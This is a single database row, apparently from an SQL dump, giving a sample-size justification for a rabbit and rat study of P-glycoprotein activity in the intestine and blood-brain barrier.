	(7805,199,'sample_size_calculation_details','\"Power of 80, alpha of 0.05, expected difference - more then 20%; no drop-outs anticipated. According to our previous expirience necessary number of rabbits to assess the possible effect of drugs on P-glycoprotein functional activity in the intestine is 6. Number of rabbits to analyse the belonging of neuroprotective drugs to P-glycoprotein substrates is 12 because both inhibitor and inductor are used (omberacetam is an exeption because the HPLC methodics sensetivity). Number of rats to asses the activity of P-glycoprotein in the BBB is 30 for every group because we have used 6 time-points after fexofenadine i\\/v administration and 5 rats for every time-point. When assess P-glycoprotein chronic brain ischemia for every time-poin also 5 rats were used.\"','2022-03-31 13:23:52','2022-03-31 13:23:52'),
